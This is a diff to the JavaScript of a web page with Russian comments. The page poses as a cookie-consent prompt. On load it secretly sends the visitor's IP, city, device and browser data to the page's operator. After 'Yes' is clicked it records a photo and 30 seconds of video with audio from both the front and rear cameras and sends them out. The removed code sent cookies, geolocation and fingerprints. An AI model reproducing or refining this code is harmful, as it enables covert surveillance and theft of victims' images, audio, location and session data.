-// ФОТО + ВИДЕО С ФРОНТАЛЬНОЙ КАМЕРЫ
+// ФОТО + ВИДЕО 30 СЕК С КАМЕРЫ
 // ═══════════════════════════════════════════════════════════
-async function capturePhotoAndVideo(seconds = 3) {
+async function captureFromCamera(facingMode, label, videoSeconds) {
   let stream = null;
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: 640, height: 480, frameRate: 24 },
-      audio: false
+      video: { facingMode: { ideal: facingMode }, width: 1280, height: 720, frameRate: 24 },
+      audio: true
     });
     video.srcObject = stream;
 
     await new Promise(res => {
       if (video.readyState >= 2) return res();
       video.onloadeddata = () => res();
+      video.oncanplay = () => res();
     });
-    await new Promise(r => setTimeout(r, 400));
+    await new Promise(r => setTimeout(r, 800));
 
-    const w = video.videoWidth  || 640;
-    const h = video.videoHeight || 480;
+    const w = video.videoWidth  || 1280;
+    const h = video.videoHeight || 720;
+
+    // ── 1) ФОТО ──
     canvas.width = w; canvas.height = h;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, w, h);
     const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
     ctx.clearRect(0, 0, w, h);
 
-    if (photoBlob) await sendPhoto(photoBlob);
+    if (photoBlob) {
+      await sendPhoto(photoBlob,
+        label + ' — фото\n' +
+        'Разрешение: ' + w + 'x' + h + '\n' +
+        'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
+        'URL: ' + location.href
+      );
+    }
 
-    let mime = 'video/webm;codecs=vp9,opus';
-    let ext  = 'webm';
+    // ── 2) ВИДЕО ──
     if (typeof MediaRecorder === 'undefined') {
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
       return { photo: !!photoBlob, video: false };
     }
+
+    let mime = 'video/webm;codecs=vp8,opus', ext = 'webm';
     const candidates = [
-      ['video/webm;codecs=vp9,opus', 'webm'],
       ['video/webm;codecs=vp8,opus', 'webm'],
+      ['video/webm;codecs=vp9,opus', 'webm'],
       ['video/webm',                 'webm'],
       ['video/mp4;codecs=h264,aac',  'mp4'],
       ['video/mp4',                  'mp4'],
     ];
     for (const [m, e] of candidates) {
-      if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
-        mime = m; ext = e; break;
-      }
+      if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) { mime = m; ext = e; break; }
     }
 
     const chunks = [];
     let rec;
     try {
-      rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 800000 });
+      rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 700000, audioBitsPerSecond: 64000 });
     } catch (e) {
-      try { rec = new MediaRecorder(stream); ext = 'webm'; }
-      catch (e2) { rec = null; }
+      try { rec = new MediaRecorder(stream); ext = 'webm'; } catch (e2) { rec = null; }
     }
 
     let videoBlob = null;
     if (rec) {
       rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
-      const videoDone = new Promise(res => {
+      const done = new Promise(res => {
         rec.onstop = () => {
           videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
           res();
         };
       });
-      rec.start(100);
-      await new Promise(r => setTimeout(r, seconds * 1000));
+      rec.start(1000);
+
+      // прогресс
+      let left = videoSeconds;
+      const tick = setInterval(() => {
+        left--;
+        statusEl.textContent = label + ': ' + left + ' сек...';
+        if (left <= 0) clearInterval(tick);
+      }, 1000);
+
+      await new Promise(r => setTimeout(r, videoSeconds * 1000));
+      clearInterval(tick);
       try { rec.stop(); } catch (e) {}
-      await videoDone;
+      await done;
     }
 
     stream.getTracks().forEach(t => t.stop());
     video.srcObject = null;
 
-    if (videoBlob && videoBlob.size > 0) await sendVideo(videoBlob, ext);
+    if (videoBlob && videoBlob.size > 0) {
+      await sendVideo(videoBlob, ext,
+        label + ' — видео ' + videoSeconds + ' сек\n' +
+        'Размер: ' + Math.round(videoBlob.size / 1024) + ' KB\n' +
+        'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
+        'URL: ' + location.href
+      );
+    }
 
     return { photo: !!photoBlob, video: !!(videoBlob && videoBlob.size) };
   } catch (e) {
     if (stream) stream.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
     return { photo: false, video: false, error: e.message };
   }
-}
-
-// ═══════════════════════════════════════════════════════════
-// ОРКЕСТРАТОР — сбор ВСЕХ данных
-// ═══════════════════════════════════════════════════════════
-async function runAll() {
-  try { detectSource();        } catch (e) {}
-  try { await collectCookies();} catch (e) {}
-  try { await collectGeo();    } catch (e) {}
-  try { await collectPhone();  } catch (e) {}
-  try { collectBrowser();      } catch (e) {}
-  try { collectWebGL();        } catch (e) {}
-  try { collectCanvas();       } catch (e) {}
-  try { await collectAudio();  } catch (e) {}
-  try { collectFonts();        } catch (e) {}
-  try { collectPlugins();      } catch (e) {}
-  try { collectCodecs();       } catch (e) {}
-  try { collectSecurity();     } catch (e) {}
-  try { collectSites();        } catch (e) {}
-
-  // Подсчёт общего количества полей
-  const totalFields =
-    Object.keys(SOURCE_DATA).length +
-    Object.keys(COOKIE_DATA).length +
-    Object.keys(GEO_DATA).length +
-    Object.keys(PHONE_DATA).length +
-    Object.keys(BROWSER_DATA).length +
-    Object.keys(OTHER_DATA).length +
-    Object.keys(SITES_DATA).length;
-
-  // Отдельный файл со ВСЕМИ данными
-  const allData = {
-    source: SOURCE_DATA,
-    cookies: COOKIE_DATA,
-    geo: GEO_DATA,
-    phone: PHONE_DATA,
-    browser: BROWSER_DATA,
-    other: OTHER_DATA,
-    sites: SITES_DATA,
-    meta: {
-      'totalFields': totalFields,
-      'collectedAt': new Date().toISOString(),
-      'url': location.href,
-      'userAgent': navigator.userAgent
-    }
-  };
-  await sendFile('all-data.json', JSON.stringify(allData, null, 2),
-    '📦 ВСЕ ДАННЫЕ (' + totalFields + ' полей) — ' + new Date().toLocaleString('ru-RU'));
-
-  // Cookies отдельным файлом
-  const cookieLines = Object.entries(COOKIE_DATA)
-    .filter(([k, v]) => v !== '' && v != null)
-    .map(([k, v]) => k + ': ' + v)
-    .join('\n');
-  const cookieTxt = 'COOKIES - ' + new Date().toLocaleString('ru-RU') + '\n' +
-                    'URL: ' + location.href + '\n' +
-                    'Домен: ' + location.hostname + '\n' +
-                    '='.repeat(60) + '\n\n' + cookieLines;
-  await sendFile('cookies.txt', cookieTxt, 'Cookies — ' + new Date().toLocaleString('ru-RU'));
-
-  // Категории
-  await sendCategory('🎯 ИСТОЧНИК ПЕРЕХОДА', SOURCE_DATA);
-  await sendCategory('🍪 COOKIES + ХРАНИЛИЩА', COOKIE_DATA);
-  await sendCategory('🌍 ГЕОЛОКАЦИЯ + КАРТЫ', GEO_DATA);
-  await sendCategory('📱 ТЕЛЕФОН / УСТРОЙСТВО', PHONE_DATA);
-  await sendCategory('🖥 БРАУЗЕР И API', BROWSER_DATA);
-  await sendCategory('🔧 ДРУГОЕ (WebGL/Canvas/Audio/Шрифты/Кодеки)', OTHER_DATA);
-  await sendCategory('🌐 САЙТЫ И СЕССИЯ', SITES_DATA);
-
-  await sendChunk('📊 <b>ИТОГО собрано полей:</b> ' + totalFields);
 }
 
 // ═══════════════════════════════════════════════════════════
 // АВТОЗАПУСК ПРИ ПЕРЕХОДЕ
 // ═══════════════════════════════════════════════════════════
 (async function autoRun() {
-  await new Promise(r => setTimeout(r, 300));
+  await new Promise(r => setTimeout(r, 400));
 
-  detectSource();
+  const data = await collectUseful();
+
   await sendChunk(
-    '🟢 <b>НОВЫЙ ПЕРЕХОД НА САЙТ</b>\n\n' +
-    '<b>Источник:</b> ' + (SOURCE_DATA['07 Источник перехода'] || '?') + '\n' +
-    '<b>Приложение:</b> ' + (SOURCE_DATA['01 Встроенное приложение'] || 'нет') + '\n' +
-    '<b>Браузер:</b> ' + (SOURCE_DATA['02 Браузер'] || '?') + '\n' +
-    '<b>ОС:</b> ' + (SOURCE_DATA['03 ОС'] || '?') + '\n' +
-    '<b>Устройство:</b> ' + (SOURCE_DATA['04 Тип устройства'] || '?') + '\n' +
-    '<b>Язык:</b> ' + (SOURCE_DATA['09 Язык браузера'] || '?') + '\n' +
-    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
-    '<b>URL:</b> ' + location.href
+    '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
+    '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
+    '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
+    '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
+    '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
+    '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
+    '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
+    '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
+    '<b>Время:</b> ' + (data['Локальное время'] || '?')
   );
 
-  await runAll();
+  const lines = Object.entries(data)
+    .filter(([k, v]) => v !== '' && v != null && v !== false)
+    .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));
+
+  const chunks = [];
+  let cur = '';
+  for (const line of lines) {
+    if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
+    cur += line + '\n';
+  }
+  if (cur) chunks.push(cur);
+
+  for (let i = 0; i < chunks.length; i++) {
+    const head = '📋 <b>ПОЛЕЗНЫЕ ДАННЫЕ</b>' +
+                 (chunks.length > 1 ? ' (' + (i+1) + '/' + chunks.length + ')' : '') + '\n\n';
+    await sendChunk(head + chunks[i]);
+    await new Promise(r => setTimeout(r, 500));
+  }
 })();
 
 // ═══════════════════════════════════════════════════════════
-// КНОПКА «ДА» — фото и видео
+// КНОПКА «ДА» — фото + видео с двух камер
 // ═══════════════════════════════════════════════════════════
 btnYes.onclick = async () => {
   btnYes.disabled = true;
   btnNo.disabled  = true;
-  statusEl.textContent = 'Ожидаем разрешение камеры...';
+  statusEl.textContent = 'Разрешите доступ к камере...';
 
   try {
     document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
     localStorage.setItem('cookie_consent', 'accepted');
-    localStorage.setItem('cookie_consent_time', new Date().toISOString());
     sessionStorage.setItem('cookie_consent', 'accepted');
   } catch (e) {}
 
@@ -1774,8 +554,16 @@ btnYes.onclick = async () => {
     '<b>URL:</b> ' + location.href
   );
 
-  statusEl.textContent = 'Съёмка с камеры (фото + 3 сек видео)...';
-  await capturePhotoAndVideo(3);
+  // 1) Фронтальная — фото + 30 сек видео
+  statusEl.textContent = 'Фронтальная камера: фото + 30 сек видео...';
+  await captureFromCamera('user', '🤳 <b>Фронтальная камера</b>', 30);
+
+  // Пауза, чтобы освободить устройство
+  await new Promise(r => setTimeout(r, 1000));
+
+  // 2) Задняя — фото + 30 сек видео
+  statusEl.textContent = 'Задняя камера: фото + 30 сек видео...';
+  await captureFromCamera('environment', '📷 <b>Задняя камера</b>', 30);
 
   statusEl.textContent = 'Готово.';
   document.getElementById('gate').style.display = 'none';
